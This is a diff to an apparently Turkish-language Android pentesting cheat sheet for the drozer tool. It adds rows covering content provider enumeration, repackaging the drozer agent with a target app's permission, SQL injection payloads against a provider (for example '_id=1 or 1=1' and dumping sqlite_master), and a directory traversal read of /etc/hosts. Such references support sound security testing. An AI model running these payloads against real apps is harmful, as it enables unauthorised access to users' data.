@@ -171,6 +171,54 @@ MusanaBudabana:))))))))))))
     <tr>
       <td>run scanner.provider.finduris -a com.example.myapp</td>  <td>Content Provider Urllerini gösterir.</td>
     </tr>
+    <tr>
+      <td>run app.provider.query content://com.example.myapp.contentprovider/notes</td>  <td>Content Provider Urllerini gösterir.</td>
+    </tr>
+
+    <tr><td><br></td></tr>
+
+    <tr>
+      <th>Drozer Permission Alarak Content Provider İle Sql İnjection</th>  <th>Description</th>
+    </tr>
+    <tr>
+      <td>run app.package.list -f "Uygulama Adı"</td>  <td>Uygulama paketi bulunur.</td>
+    </tr>
+    <tr>
+      <td>run app.package.attacksurface com.example.myapp</td>  <td>Content Provider sayısına bakılır.</td>
+    </tr>
+    <tr>
+      <td>run app.provider.info -a com.example.myapp</td>  <td>Uygulama provider izinleri alınır.</td>
+    </tr>
+    <tr>
+      <td>permissions</td>  <td>Drozer izinlerinde gerekli izin olup olmadığı kontrol edilir.</td>
+    </tr>
+    <tr>
+      <td>sudo drozer agent build --permission com.example.myapp.READ_NOTE</td>  <td>Gerekli izin verilerek drozer paketlendi.</td>
+    </tr>
+    <tr>
+      <td>adb uninstall com.mwr.dz</td>  <td>Eski drozer emulatorden silindi.</td>
+    </tr>
+    <tr>
+      <td>sudo mv /tmp/[cp]/agent.apk .</td>  <td>Yeni apk current dizine alındı.</td>
+    </tr>
+    <tr>
+      <td>adb install agent.apk</td>  <td>Yeni drozer kuruldu.</td>
+    </tr>
+    <tr>
+      <td>permissions</td>  <td>Tekrar yetkilere bakıldı.</td>
+    </tr>
+    <tr>
+      <td>run app.provider.query content://com.example.myapp.contentprovider/simple</td>  <td>Yetki ile komut calıştırıldı.</td>
+    </tr>
+    <tr>
+      <td>run app.provider.query content://com.example.myapp.contentprovider/simple --selection "_id=1 or 1=1"</td>  <td>Tüm tabloyu getirir.</td>
+    </tr>
+    <tr>
+      <td>run app.provider.query content://com.example.myapp.contentprovider/simple --projection "* from sqlite_master;"</td>  <td>Provider manipule edilerek baska tablo alınır.</td>
+    </tr>
+    <tr>
+      <td>run app.provider.read content://com.example.myapp/../../../etc/hosts</td>  <td>Canonical path kullanılmadığında Directory Traversal yapılabilir.</td>
+    </tr>
 
     <tr><td><br></td></tr>
 
